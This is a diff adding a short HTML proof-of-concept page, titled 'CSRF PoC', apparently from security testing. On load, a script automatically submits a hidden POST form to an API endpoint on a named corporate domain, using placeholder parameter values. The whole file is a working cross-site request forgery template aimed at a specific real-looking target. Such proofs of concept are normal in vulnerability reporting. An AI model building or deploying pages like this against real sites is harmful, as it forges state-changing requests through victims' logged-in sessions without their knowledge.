@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Exploit</h1>
+    <form id="csrfForm" action="https://gerp.cat.com/api/Project/EditFuel" method="POST">
+        <input type="hidden" name="parameter1" value="exploit_value">
+        <input type="hidden" name="parameter2" value="another_value">
+    </form>
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
